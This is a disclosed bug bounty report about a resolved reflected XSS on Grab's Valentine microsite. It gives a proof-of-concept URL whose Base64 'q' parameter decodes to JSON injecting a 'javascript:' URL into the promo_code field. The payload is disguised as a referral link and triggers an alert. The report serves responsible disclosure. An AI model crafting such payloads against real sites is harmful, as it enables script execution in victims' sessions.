---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '320679'
original_report_id: '320679'
title: '[growth.grab.com] Reflected XSS via Base64-encoded "q" param on "my.html"
  Valentine''s microsite'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: grab
created_at: '2018-02-28T07:28:20.699Z'
disclosed_at: '2018-03-02T09:03:35.195Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 25
asset_identifier: '*.grab.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [growth.grab.com] Reflected XSS via Base64-encoded "q" param on "my.html" Valentine's microsite

## Metadata

- HackerOne Report ID: 320679
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: grab
- Disclosed At: 2018-03-02T09:03:35.195Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

An encoded injection in the `q` parameter on `my.html` can be used to reflect JavaScript in the `growth.grab.com` context. This microsite creates a "Grab's Valentine" card for a driver over the past year, and carries its data in Base64 format. 

## Proof of concept

Please visit the following URL, scroll down and select the **Copy** button. To demonstrate JavaScript execution, the `growth.grab.com` context will be displayed in a standard alert box.

```
https://growth.grab.com/valentine/active/my.html?q=eyJuYW1lIjogIlRlc3QgSGFja2VyT25lIiwgInN0YXJ0X2RhdGUiOiAiMDEuMDEuMjAxOCIsICJsZWFucGx1bV9pZCI6ICJ0ZXN0IiwgInJpZGVzIjogIjIwMCIsICJwbGFjZXMiOiAiMjAiLCAiZGlzdGFuY2UiOiA1MDAsICJjYW5jZWxfdGltZXMiOiAiMCIsICJkYXlzIjogIjEwMCIsICJwcm9tb19jb2RlIjogImphdmFzY3JpcHQ6Ly9yLmdyYWIuY29tL3Rlc3QlMGFhbGVydChkb2N1bWVudC5kb21haW4pIiwgInByZl9yZXdhcmQiOiAiMTAifQ==
```

The above proof of concept targets the `promo_code` JSON key to inject an unfiltered JavaScript URL which an adversary could craft to be convincingly like a referral address:

```
{"name": "Test HackerOne", "start_date": "01.01.2018", "leanplum_id": "test", "rides": "200", "places": "20", "distance": 500, "cancel_times": "0", "days": "100", "promo_code": "javascript://r.grab.com/test%0aalert(document.domain)", "prf_reward": "10"}
```
### Supporting evidence

{F267789}

## Verified conditions

At the time of testing, I have successfully confirmed exploitability in the following environment:

* Chrome OS 63.0.3239.140 (Official Build) (64-bit)
* Firefox 59.0b7 stable (32-bit) on Windows 10 x64

Thanks,

Yasin

## Impact

An adversary can leverage this vulnerability in a crafted GET request that, if issued by another Growth user, will cause arbitrary JavaScript code to execute within the target's browser in the context of their web session.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
